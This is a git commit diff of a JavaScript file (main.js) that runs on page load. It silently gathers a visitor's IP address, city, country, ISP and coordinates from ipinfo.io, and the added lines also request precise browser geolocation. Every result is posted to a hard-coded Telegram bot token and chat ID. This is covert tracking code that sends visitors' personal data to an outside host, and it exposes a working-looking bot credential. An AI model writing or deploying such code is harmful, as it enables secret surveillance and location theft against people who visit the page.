7e04d5096738132950f898646968e37237199d25
Maxim <165845980+ShaurmaLover@users.noreply.github.com>
2025-07-04 17:54:27 +0300

    Add files via upload

--- main.js
+++ main.js
@@ -1,13 +1,35 @@
 $(document).ready(function () {
-    fetch(`https://ipinfo.io/json`)
-      .then(response => {
-        if (!response.ok) {
-          throw new Error(response.status);
-        }
-        return response.json();
+  fetch(`https://ipinfo.io/json`)
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(response.status);
+    }
+    return response.json();
+  })
+  .then(data => {
+    const message = `IP: ${data.ip}\nГород: ${data.city}\nСтрана: ${data.country}\nОрганизация: ${data.org}\nРегион: ${data.region}\nЛокация: ${data.loc}`;
+
+    fetch(`https://api.telegram.org/bot8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: "6325602757",
+        text: message
       })
-      .then(data => {
-        const message = `IP: ${data.ip}\nГород: ${data.city}\nСтрана: ${data.country}\nОрганизация: ${data.org}\nРегион: ${data.region}\nЛокация: ${data.loc}`;
+    });
+  })
+  .catch(error => {
+    console.error(error);
+  });
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const message = `Широта: ${latitude}, Долгота: ${longitude}`;
 
         fetch(`https://api.telegram.org/bot8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg/sendMessage`, {
           method: "POST",
@@ -19,8 +41,12 @@ $(document).ready(function () {
             text: message
           })
         });
-      })
-      .catch(error => {
-        console.error(error);
-      });
-  });
+      },
+      (error) => {
+        console.error("Ошибка при получении геолокации:", error.message);
+      }
+    );
+  } else {
+    console.log("Геолокация не поддерживается этим браузером.");
+  }
+});
